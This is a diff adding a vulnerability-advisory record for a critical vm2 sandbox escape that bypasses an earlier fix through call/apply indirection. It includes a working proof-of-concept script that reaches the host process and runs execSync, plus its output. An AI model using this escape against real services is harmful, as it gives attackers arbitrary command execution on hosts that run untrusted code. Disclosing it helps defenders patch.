@@ -1,0 +1,62 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2026-10-01T15:32:11Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "vm2"
+  },
+  "Advisory": {
+    "DatabaseId": 505248,
+    "Id": "GSA_kwCzR0hTQS02NDdmLWc5OGotcXEyNc4AB7Wg",
+    "GhsaId": "GHSA-647f-g98j-qq25",
+    "References": [
+      {
+        "Url": "https://github.com/patriksimek/vm2/security/advisories/GHSA-647f-g98j-qq25"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-92937"
+      },
+      {
+        "Url": "https://github.com/patriksimek/vm2/commit/315786904c416be68ff2517b86fb9d71fa6761db"
+      },
+      {
+        "Url": "https://github.com/patriksimek/vm2/releases/tag/v3.11.7"
+      },
+      {
+        "Url": "https://www.vulncheck.com/advisories/vm2-3.11.6-remote-code-execution-via-promise-call-apply"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-647f-g98j-qq25"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-647f-g98j-qq25"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-92937"
+      }
+    ],
+    "Description": "## Summary\n\nUntrusted JavaScript run by vm2 can escape the sandbox and execute arbitrary commands in the host Node.js process when an embedder-exposed host Promise rejects. This is an incomplete fix for GHSA-m283-3h24-438v: the advisory's capability-bearing rejection rebuild runs only through this direct Promise-handler path, so call/apply indirection bypasses the protection it introduced. The bridge sanitises host rejection values before sandbox callbacks run, but the gate at `lib/bridge.js:1624` identity-checks only the direct call target. Registering the rejection handler through `Function.prototype.call` indirection, `p.then.call(p, undefined, cb)`, makes the intercepted target host `Function.prototype.call`, so the sanitiser never runs and the raw host error reaches the sandbox (`lib/bridge.js:1639`) without the rebuild that strips host references carried by its own properties (`lib/setup-sandbox.js:2104`). A rejection error whose own property references a powerful host object, for example `err.detail = process`, therefore reaches sandbox code as a fully functional proxy, and `e.detail.mainModule.require('child_process').execSync(...)` executes with host privileges. The `.apply` form and a stacked `call.call` behave identically.\n\n## PoC\n\nSave as `poc.js` and run `node poc.js`:\n\n```js\nconst { VM } = require('vm2');\nconst vm = new VM({ sandbox: {\n  fetchUser: async () =\u003e {\n    const err = new Error('db connection failed');\n    err.detail = process; // embedder-attached host reference\n    throw err;\n  },\n}});\nvm.run(`\n  const p = fetchUser(1);              // proxy of the host Promise\n  p.then.call(p, undefined, (e) =\u003e {   // .call indirection skips the sanitiser\n    e.detail.mainModule.require('child_process')\n      .execSync('echo vm2-escape-proof \u003e /tmp/poc.proof');\n  });\n`);\n```\n\n### Observed output\n\n```shell\n$ cat /tmp/poc.proof\nvm2-escape-proof\n```\n\nRegistering the same callback directly, `p.then(undefined, cb)`, strips `detail` and no command runs; the `bind` and `Reflect.apply` forms are sanitised as well, isolating the bypass to `call` and `apply` indirection.\n\n## Impact\n\nAny deployment that evaluates attacker-controlled code with vm2 and exposes a host-realm Promise to the sandbox is affected: an async host function bridged through the `sandbox` option, or a NodeVM external module's async method. If that Promise rejects with an Error carrying a non-primitive own property that references a host object, a diagnostic pattern the vm2 codebase itself documents as routine for Node libraries (`lib/setup-sandbox.js:1877`), a single submission yields arbitrary command execution in the host process with the host account's privileges, including file read and write, process spawning, and network access. In a multi-tenant service evaluating untrusted code, one submission compromises the worker process and every tenant it serves.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-10-01T15:32:10Z",
+    "Severity": "CRITICAL",
+    "Summary": "vm2: GHSA-m283-3h24-438v fix bypass leads to host RCE via call/apply indirection",
+    "UpdatedAt": "2026-10-01T15:32:11Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 10,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "3.11.7"
+      },
+      "VulnerableVersionRange": "= 3.11.6"
+    }
+  ]
+}
